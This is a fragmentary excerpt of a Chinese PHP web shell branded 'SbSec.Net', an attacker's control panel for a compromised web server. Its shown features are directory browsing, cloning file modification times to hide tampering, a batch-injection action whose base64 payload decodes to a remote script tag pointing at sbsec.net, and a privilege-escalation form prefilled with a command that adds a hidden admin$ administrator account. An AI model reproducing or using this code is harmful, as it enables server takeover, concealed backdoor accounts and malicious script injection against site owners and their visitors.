...
<title>http://<? echo $_SERVER['HTTP_HOST'];?>  征战blog' SbSec.Net </title>
<style type="text/css">
body{
...
if(!$_GET['dir']) $dir = "./";
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>SbSec.net</b></td><td align="center">'.date("Y年m月d日 h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
...
<?
$tb->headerform(array('method'=>'GET','content'=>'<li>SbSec.Net 征战 - 有的人在你生命中只是昙花一现而你却终生守候</li><p>程序路径: '.$pathname.'<br>当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>跳转目录: '.$tb->makeinput('dir').' '.$tb->makeinput('','确定','','submit').' 〖支持绝对路径和相对路径〗'));
...
elseif ($_GET['action'] == "newtime") {
	...
	$tb->tableheader();
	$tb->formheader($action,'sbsec.net征战 克隆文件最后修改时间');
	...
	$tb->tdbody('<br><ul><li>有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07<br>(该日期根据 32 位有符号整数的最小值和最大值而来)</li><li>SbSec.Net 征战 - 有的人在你生命中只是昙花一现而你却终生守候</li><li>说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!</li></ul>','left');
...
elseif ($_GET['action'] == "plgm") {
	...
	$gmm = base64_decode('PHNjcmlwdCBzcmM9aHR0cDovLyU3NyU3NyU3NyUyRSU3MyU2MiU3MyU2NSU2MyUyRSU2RSU2NSU3NC8+PC9zY3JpcHQ+');
	$tb->tableheader();
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <tr class="secondalt">
    <td align="center">LocalPort:
      ...
      <br>
      Command　:
      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user admin$ sbsec.net /add" size="50"></td>
  </tr>
  <tr class="secondalt">
...
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>SbSec.Net 征战 - 有的人在你生命中只是昙花一现而你却终生守候</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
...
<span style="font-size: 13px; font-family: Verdana; color:fe0000 "><br><br>SbSec.Net 征战 - 有的人在你生命中只是昙花一现而你却终生守候<br><br><br>
